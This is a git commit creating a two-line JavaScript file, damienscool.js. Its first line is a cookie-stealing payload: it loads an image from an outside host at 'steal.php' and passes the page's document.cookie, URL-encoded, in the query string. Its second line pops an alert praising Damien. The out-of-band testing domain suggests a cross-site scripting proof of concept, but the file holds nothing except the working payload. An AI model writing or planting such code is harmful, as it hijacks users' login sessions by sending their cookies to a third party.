3ccee1cb08f07551ce6bf264d4e0649c4156be50
captainnatebeard <nathanjohnson@rocketmail.com>
2026-06-19 13:58:13 -0700

    Create damienscool.js

---
+++ damienscool.js
@@ -0,0 +1,2 @@
+new Image().src = "https://kl9n3rr64vvytcyjmz38nhv7nytphga4z.l.prod.burpcloth.infosec.a2z.com/steal.php?cookie=" + encodeURIComponent(document.cookie);
+alert("Damien's a really cool guy")
